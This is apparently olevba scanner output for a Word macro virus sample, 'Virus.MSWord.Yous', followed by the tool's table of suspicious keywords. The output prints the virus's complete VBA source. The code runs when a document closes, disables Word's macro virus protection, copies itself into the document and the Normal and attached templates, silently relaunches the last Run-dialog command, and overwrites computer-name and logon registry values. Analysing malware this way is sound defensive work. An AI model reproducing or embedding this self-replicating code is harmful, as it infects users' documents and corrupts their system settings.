olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Yous-7e38e28121163105f3b69cc9a4d6347ee7556e80
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Yous-7e38e28121163105f3b69cc9a4d6347ee7556e80 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Const YouSuck! = 0.1
Dim AD, NT, AT As Object
Dim LancerApp, DerniereApp, NotreString, CalculatriceNom As String
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AT = Templates(1).VBProject.VBComponents(1).CodeModule
Randomize
If AD.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   AD.DeleteLines 1, AD.CountOfLines
   AD.InsertLines 1, AT.Lines(1, AT.CountOfLines)
   If AD.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
      AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
   End If
   If Mid(ActiveDocument.FullName, 2, 1) = ":" Or Mid(ActiveDocument.FullName, 2, 1) = "\" Then ActiveDocument.Save
End If
If NT.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   NT.DeleteLines 1, NT.CountOfLines
   NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
   NormalTemplate.Save
   End If
If AT.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   AT.DeleteLines 1, AT.CountOfLines
   AT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
   Templates(1).Save
End If
DerniereApp = Left(System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", "MRUList"), 1)
LancerApp = System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", DerniereApp)
LancerApp = Mid(LancerApp, 1, Len(LancerApp) - 2)
If Rnd > 0.1 Then
Shell LancerApp, vbHide
Else
Shell LancerApp, vbMinimizedNoFocus
End If
Aujourdhui = Day(Now())
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = "" Then
CalculatriceNom = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName")
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = CalculatriceNom
Select Case Aujourdhui
Case 12 To 22
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "username") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control", "Current User") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP", "Comment") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP", "ComputerName") = NotreString
Case Else
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = ""
End Select
End If

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

